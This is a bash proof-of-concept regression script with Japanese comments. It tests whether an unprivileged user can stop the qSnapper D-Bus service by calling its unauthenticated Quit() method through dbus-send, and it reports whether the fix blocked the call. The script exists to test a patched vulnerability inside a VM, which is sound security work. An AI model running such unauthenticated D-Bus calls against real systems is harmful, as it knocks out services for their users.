#!/bin/bash
#
# @file poc_quit_dos.sh
# @brief Issue #5b: 無認証のQuit()によるサービス停止DoSのPoC
#
# bobがdbus-sendでQuit()を呼び、サービスを停止させられるかを確認する
# 修正版(P1-6)ではQuit() D-Busメソッドが削除されておりUnknownMethodになる
#
# 使い方 : poc_quit_dos.sh            (fixedモード)
#          BASELINE=1 poc_quit_dos.sh (baselineモード)
# 終了コード : 0 = 期待どおり、1 = 想定外、2 = 環境エラー
#

set -u    # 未定義変数の参照をエラーにする
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"    # 本スクリプトのあるディレクトリ
source "$SCRIPT_DIR/common.sh"

assert_running_in_vm
assert_qsnapper_service

BOB="${BOB_USER:-bob}"    # Quit()を呼ぶ非特権ユーザー(環境変数で上書き可)

# サービス稼働中であることを再確認するためPIDを取得する
PID_BEFORE=$(pgrep -f "qSnapper.*--dbus-service" | head -1 || true)
log "qSnapper service PID before: $PID_BEFORE"

# bobがQuit()を呼ぶ
OUTPUT=$(sudo -u "$BOB" dbus-send --system --print-reply \
    --dest="$DBUS_SERVICE" "$DBUS_PATH" \
    "${DBUS_IFACE}.Quit" 2>&1 || true)
log "Quit() response: $OUTPUT"

# プロセス停止を待つ
sleep 1
PID_AFTER=$(pgrep -f "qSnapper.*--dbus-service" | head -1 || true)
log "qSnapper service PID after: $PID_AFTER"

# Quit()が削除されていればUnknownMethodが返る (修正版)
if echo "$OUTPUT" | grep -qE "UnknownMethod"; then
    log "Quit() method is removed — good"
    report_result blocked
# PIDが変化したか消えた場合は無認証のQuit()で停止した=脆弱性再現
elif [[ "$PID_BEFORE" != "$PID_AFTER" || -z "$PID_AFTER" ]]; then
    log "Service was killed by unauthenticated Quit() — vulnerability reproduced"
    report_result reproduced
# Quit()が残っていても停止しなければ阻止成功とみなす
else
    log "Service survived despite Quit() being available — unusual"
    report_result blocked
fi
